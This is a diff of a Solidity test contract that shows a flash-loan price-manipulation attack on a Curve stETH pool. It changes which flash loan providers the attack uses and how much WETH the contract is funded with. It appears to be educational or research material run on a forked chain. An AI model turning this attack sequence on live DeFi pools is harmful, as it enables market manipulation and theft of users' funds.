@@ -20,13 +20,13 @@ contract PriceManipulationExample is PriceManipulation, FlashLoan, Tokens {
         console.log("---------------------------------------------------------------------------");
         console.log("Curve Virtual Price BEFORE:", curvePool.get_virtual_price());
         // Deal ether to cover fees and losses
-        deal(EthereumTokens.WETH, address(this), 22.3 ether);
+        deal(EthereumTokens.WETH, address(this), 40 ether);
         deal(EthereumTokens.NATIVE_ASSET, address(this), 3.5 ether);
-        takeFlashLoan(FlashLoanProviders.AAVEV3, EthereumTokens.WETH, flashLoanAmount);
+        takeFlashLoan(FlashLoanProviders.UNISWAPV3, EthereumTokens.WETH, flashLoanAmount);
     }
 
     function _executeAttack() internal override(PriceManipulation, FlashLoan) {
-        if (currentFlashLoanProvider() == FlashLoanProviders.BALANCER) {
+        if (currentFlashLoanProvider() == FlashLoanProviders.AAVEV3) {
             // Unwrap flash loaned wstETH to manipulate Curve pool
             console.log("---------------------------------------------------------------------------");
             IWrapped(address(EthereumTokens.wstETH)).unwrap(flashLoanAmount);
@@ -48,19 +48,19 @@ contract PriceManipulationExample is PriceManipulation, FlashLoan, Tokens {
             // Wrap stETH to pay back flash loan
             EthereumTokens.stETH.approve(address(EthereumTokens.wstETH), type(uint256).max);
             IWrapped(address(EthereumTokens.wstETH)).wrap(EthereumTokens.stETH.balanceOf(address(this)));
-        } else if (currentFlashLoanProvider() == FlashLoanProviders.AAVEV3) {
+        } else if (currentFlashLoanProvider() == FlashLoanProviders.UNISWAPV3) {
             // Unwrap ether to use in price manipulation
             IWrappedEther(address(EthereumTokens.WETH)).withdraw(flashLoanAmount);
 
             // Borrow wstETH
-            takeFlashLoan(FlashLoanProviders.BALANCER, EthereumTokens.wstETH, flashLoanAmount);
+            takeFlashLoan(FlashLoanProviders.AAVEV3, EthereumTokens.wstETH, flashLoanAmount);
 
-            // Unrawp wstETH and swap stETH to Ether to pay back AAVEV3 loan
+            // Unrawp wstETH and swap stETH to Ether to pay back UniswapV3 loan
             IWrapped(address(EthereumTokens.wstETH)).unwrap(EthereumTokens.wstETH.balanceOf(address(this)));
             EthereumTokens.stETH.approve(address(curvePool), type(uint256).max);
             curvePool.exchange(1, 0, EthereumTokens.stETH.balanceOf(address(this)), 0);
 
-            // Wrap Ether to pay back AAVEV3 loan
+            // Wrap Ether to pay back UniswapV3 loan
             IWrappedEther(address(EthereumTokens.WETH)).deposit{value: address(this).balance}();
             console.log("---------------------------------------------------------------------------");
             console.log("Pay back WETH flash loan");
